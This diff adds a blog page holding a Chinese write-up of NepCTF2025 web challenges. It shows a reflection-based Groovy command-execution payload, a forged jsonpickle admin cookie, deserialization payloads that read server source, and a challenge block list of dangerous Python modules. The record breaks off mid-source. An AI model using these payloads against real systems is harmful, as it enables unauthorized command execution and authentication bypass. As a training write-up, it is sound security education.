@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebeasyGooGooVVVY考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打 搜到一篇文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;TWX521&#x2F;p&#x2F;17916224.html 1java.lang.String.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().ex">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF2025">
+<meta property="og:url" content="http://example.com/2025/07/25/NepCTF2025/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="WebeasyGooGooVVVY考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打 搜到一篇文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;TWX521&#x2F;p&#x2F;17916224.html 1java.lang.String.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().ex">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250725193910495.png">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250725201654231.png">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250726031051869.png">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250726032302337.png">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250729105943641.png">
+<meta property="og:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250729110039455.png">
+<meta property="article:published_time" content="2025-07-25T11:36:11.000Z">
+<meta property="article:modified_time" content="2025-07-29T10:16:51.536Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="NepCTF2025">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/achieve/202411/NepCTF2025/image-20250725193910495.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NepCTF2025</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/07/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/18/Java%E5%B8%B8%E7%94%A8%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/25/NepCTF2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/25/NepCTF2025/&text=NepCTF2025"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/25/NepCTF2025/&is_video=false&description=NepCTF2025"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF2025&body=Check out this article: http://example.com/2025/07/25/NepCTF2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/25/NepCTF2025/&name=NepCTF2025&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/25/NepCTF2025/&t=NepCTF2025"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyGooGooVVVY"><span class="toc-number">2.</span> <span class="toc-text">easyGooGooVVVY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-bank"><span class="toc-number">3.</span> <span class="toc-text">safe_bank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">#jsonpickle反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevengeGooGooVVVY"><span class="toc-number">4.</span> <span class="toc-text">RevengeGooGooVVVY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">方法一:属性访问表达式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-getClass-%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">方法二:getClass()方法绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaSeri"><span class="toc-number">5.</span> <span class="toc-text">JavaSeri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">5.1.</span> <span class="toc-text">#shiro550</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NepCTF2025
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-25T11:36:11.000Z" class="dt-published" itemprop="datePublished">2025-07-25</time>
+        
+        (Updated: <time datetime="2025-07-29T10:16:51.536Z" class="dt-updated" itemprop="dateModified">2025-07-29</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/NepCTF2025/" rel="tag">NepCTF2025</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a>easyGooGooVVVY</h2><p>考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打</p>
+<p>搜到一篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/TWX521/p/17916224.html">https://www.cnblogs.com/TWX521/p/17916224.html</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.String.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<p>任意一个内置类的原型类都会有forName这个静态方法，那就很好做了</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250725193910495.png" alt="image-20250725193910495"></p>
+<p>能回显，然后也没过滤什么命令，直接打就行，flag在env环境变量中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.String.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<h2 id="safe-bank"><a href="#safe-bank" class="headerlink" title="safe_bank"></a>safe_bank</h2><h3 id="jsonpickle反序列化"><a href="#jsonpickle反序列化" class="headerlink" title="#jsonpickle反序列化"></a>#jsonpickle反序列化</h3><p>注册登录进去改cookie，本来以为需要注意时间戳什么的，但是直接伪造就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#123;&#123;&quot;py/object&quot;: &quot;__main__.Session&quot;, &quot;meta&quot;: &#123;&#123;&quot;user&quot;: &quot;admin&quot;, &quot;ts&quot;: &#123;&#125;&#125;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line"></span><br><span class="line">base64_text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64_text)</span><br></pre></td></tr></table></figure>
+
+<p>然后直接改cookie就拿到admin了</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250725201654231.png" alt="image-20250725201654231"></p>
+<p>但是是一个假的flag，返回去看cookie，用flask-unsign解密一下发现是jsonpickle的格式</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/tmp# flask-unsign --decode --cookie <span class="string">&quot;eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjExMTEiLCAidHMiOiAxNzUzNDQ4Mjg2fX0=&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;py/object&#x27;</span>: <span class="string">&#x27;__main__.Session&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>: &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;1111&#x27;</span>, <span class="string">&#x27;ts&#x27;</span>: 1753448286&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且这里带有时间戳，这里需要注意设置一下</p>
+<p>一开始尝试读取全局信息的</p>
+<p>读取全局信息的方法</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;py/mod&quot;</span>: <span class="string">&quot;__main__/x.__dict__&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;py/function&quot;</span>: <span class="string">&quot;__main__.__dict__&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;py/type&quot;</span>: <span class="string">&quot;__main__.__dict__&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># command_to_execute =</span></span><br><span class="line"></span><br><span class="line">payload = &#123;<span class="string">&#x27;py/object&#x27;</span>: <span class="string">&#x27;__main__.Session&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>: &#123;<span class="string">&#x27;user&#x27;</span>: &#123;<span class="string">&quot;py/type&quot;</span>: <span class="string">&quot;__main__.__dict__&quot;</span>&#125;, <span class="string">&#x27;ts&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 Python 字典转换为 JSON 字符串</span></span><br><span class="line">json_payload = json.dumps(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 JSON 字符串编码为 Base64，以便放入 Cookie</span></span><br><span class="line">final_cookie_value = base64.b64encode(json_payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_cookie_value)</span><br></pre></td></tr></table></figure>
+
+<p>但是没成功，dick被过滤了</p>
+<p>先读一下源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&#x27;py/object&#x27;</span>: <span class="string">&#x27;__main__.Session&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>: &#123;<span class="string">&#x27;user&#x27;</span>: &#123;<span class="string">&#x27;py/object&#x27;</span>: <span class="string">&#x27;linecache.getlines&#x27;</span>, <span class="string">&#x27;py/newargs&#x27;</span>: [<span class="string">&#x27;app.py&#x27;</span>]&#125;, <span class="string">&#x27;ts&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到源码，拿去整理一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, render_template, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, uid, pwd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.uid = uid</span><br><span class="line">        <span class="variable language_">self</span>.pwd = pwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Session</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, meta</span>):</span><br><span class="line">        <span class="variable language_">self</span>.meta = meta</span><br><span class="line"></span><br><span class="line">users_db = [</span><br><span class="line">    Account(<span class="string">&quot;admin&quot;</span>, os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()),</span><br><span class="line">    Account(<span class="string">&quot;guest&quot;</span>, <span class="string">&quot;guest&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == username:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    users_db.append(Account(username, password))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;Popen&#x27;</span>, <span class="string">&#x27;nt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;reduce&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;marshal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;render_template&#x27;</span>, <span class="string">&#x27;jsonpickle&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;state&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;jinja2&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__func__&#x27;</span>, <span class="string">&#x27;__self__&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__mro__&#x27;</span>, <span class="string">&#x27;__subclasses__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">serialized</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = json.loads(serialized)</span><br><span class="line">        payload = json.dumps(data, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> bad <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">if</span> bad <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> bad</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        confirm_password = request.form.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password <span class="keyword">or</span> <span class="keyword">not</span> confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;所有字段都是必填的。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> password != confirm_password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;密码不匹配。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &lt; <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名至少需要4个字符，密码至少需要6个字符。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> register_user(username, password):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, message=<span class="string">&quot;注册成功！请登录。&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, error=<span class="string">&quot;用户名已存在。&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/auth&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    u = request.form.get(<span class="string">&quot;u&quot;</span>)</span><br><span class="line">    p = request.form.get(<span class="string">&quot;p&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == u <span class="keyword">and</span> acc.pwd == p:</span><br><span class="line">            sess_data = Session(&#123;<span class="string">&#x27;user&#x27;</span>: u, <span class="string">&#x27;ts&#x27;</span>: <span class="built_in">int</span>(time.time())&#125;)</span><br><span class="line">            token_raw = jsonpickle.encode(sess_data)</span><br><span class="line">            b64_token = 